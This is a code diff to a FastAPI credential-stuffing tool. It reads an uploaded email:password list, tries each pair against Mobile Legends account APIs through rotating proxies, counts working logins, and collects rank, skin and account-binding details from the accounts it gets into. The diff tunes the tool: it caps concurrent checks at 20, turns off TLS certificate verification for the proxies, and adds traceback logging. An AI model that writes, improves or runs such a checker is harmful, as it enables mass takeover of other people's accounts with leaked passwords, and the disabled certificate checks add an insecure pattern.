@@ -1,9 +1,8 @@
-# -------------------- main.py (Corrected Version for latest httpx) --------------------
 from fastapi import FastAPI, UploadFile, Form, Request
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
-import random, asyncio
+import random, asyncio, traceback
 import httpx
 
 app = FastAPI()
@@ -24,8 +23,8 @@ def get_proxy_url():
 
 async def get_async_client():
     proxy_url = get_proxy_url()
-    transport = httpx.AsyncHTTPTransport(proxy=proxy_url)
-    return httpx.AsyncClient(transport=transport, timeout=10)
+    transport = httpx.AsyncHTTPTransport(proxy=proxy_url, verify=False)
+    return httpx.AsyncClient(transport=transport, timeout=httpx.Timeout(10.0))
 
 async def get_profile(access_token, user_id):
     url = "https://accountmtapi.mobilelegends.com/Account/profile"
@@ -41,8 +40,9 @@ async def get_profile(access_token, user_id):
                 rank = info.get("rank_name", "Unknown")
                 bindings = [b.get("bind_type", "Unknown") for b in info.get("bind_list", [])]
                 return total_skins, rank, bindings
-    except Exception as e:
-        print(f"Error fetching profile: {e}")
+    except Exception:
+        print("Error fetching profile:")
+        traceback.print_exc()
     return 0, "Unknown", []
 
 async def check_account(email, password):
@@ -71,8 +71,9 @@ async def check_account(email, password):
             else:
                 results["invalid"] += 1
                 return "invalid"
-    except Exception as e:
-        print(f"Error checking account: {e}")
+    except Exception:
+        print("Error checking account:")
+        traceback.print_exc()
         return "error"
 
 @app.get("/", response_class=HTMLResponse)
@@ -82,11 +83,20 @@ async def home(request: Request):
 @app.post("/upload")
 async def upload(file: UploadFile):
     content = await file.read()
-    tasks = []
+    accounts = []
     for line in content.decode().splitlines():
         if ":" in line:
-            email, password = line.split(":", 1)
-            tasks.append(check_account(email, password))
+            email, password = line.strip().split(":", 1)
+            accounts.append((email, password))
+
+    # Limit concurrency to avoid server crash (example: 20 accounts at once)
+    semaphore = asyncio.Semaphore(20)
+
+    async def limited_check(email, password):
+        async with semaphore:
+            return await check_account(email, password)
+
+    tasks = [limited_check(email, password) for email, password in accounts]
     await asyncio.gather(*tasks)
     return JSONResponse({"status": "done", **results})
 
